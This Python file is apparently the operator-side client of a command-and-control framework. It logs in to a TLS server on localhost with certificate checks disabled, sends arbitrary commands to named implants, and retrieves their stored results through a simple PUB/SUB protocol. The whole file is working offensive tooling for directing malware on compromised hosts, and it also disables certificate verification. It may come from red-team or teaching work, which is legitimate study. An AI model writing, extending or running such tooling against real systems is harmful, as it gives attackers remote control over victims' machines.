import socket
import getpass
import ssl


def get_implant_result(uname_retr: str, pw_retr: str) -> str:
    """
    Get the stored results of commands run

    Parameters:
        uname_retr (str): The username for authentication
        pw_retr (str): The associated password

    Returns:
        str: A json blob of data str formatted
    """
    # Create the socket
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    client_context.minimum_version = ssl.TLSVersion.TLSv1_3
    client_context.maximum_version = ssl.TLSVersion.TLSv1_3
    client_context.check_hostname = False
    client_context.verify_mode = ssl.CERT_NONE
    # Wrap it in SSL
    secure_client_socket = client_context.wrap_socket(
        client
    )
    # Connect
    try:
        secure_client_socket.connect(('localhost', 9999))
        subscribe_request = f"SUB {uname_retr} {pw_retr}"
        secure_client_socket.send(subscribe_request.encode())
        response = secure_client_socket.recv(4096).decode()
        secure_client_socket.close()
        return response
    except Exception as e:
        return e


def send_command(implant_id_pub: str, uname_send: str, pw_send: str, command_pub: str) -> str:
    """
    Send command to an implant

    Parameters:
        implant_id_pub (str): The implant ID to send the command to
        uname_send (str): The username of the operator
        pw_send (str): The operators' password
        command_pub (str): The command being sent to the implant

    Returns:
        str: The server status response indicating success or error
    """
    # Create the socket
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    client_context.minimum_version = ssl.TLSVersion.TLSv1_3
    client_context.maximum_version = ssl.TLSVersion.TLSv1_3
    client_context.check_hostname = False
    client_context.verify_mode = ssl.CERT_NONE
    # Wrap it in SSL
    secure_client_socket = client_context.wrap_socket(
        client
    )
    try:
        # Connect
        secure_client_socket.connect(('localhost', 9999))
        publish_request = f"PUB {implant_id_pub} {uname_send} {pw_send} {command_pub}"
        secure_client_socket.send(publish_request.encode())
        response = secure_client_socket.recv(4096).decode()
        print(f"Server response: {response}")
        secure_client_socket.close()
    except Exception as e:
        return e


if __name__ == "__main__":
    uname = input("Enter username: ")
    pw = getpass.getpass()
    while True:
        choice = input("1: Interact or 2: Retrieve results > ")
        match choice:
            case "1":
                implant_id = input("Enter implant ID: ")
                command = input("Enter command to send: ")
                send_command(implant_id, uname, pw, command)
            case "2":
                result = get_implant_result(uname, pw)
                print(result)
            case _:
                print("Enter either 1 or 2 \n")
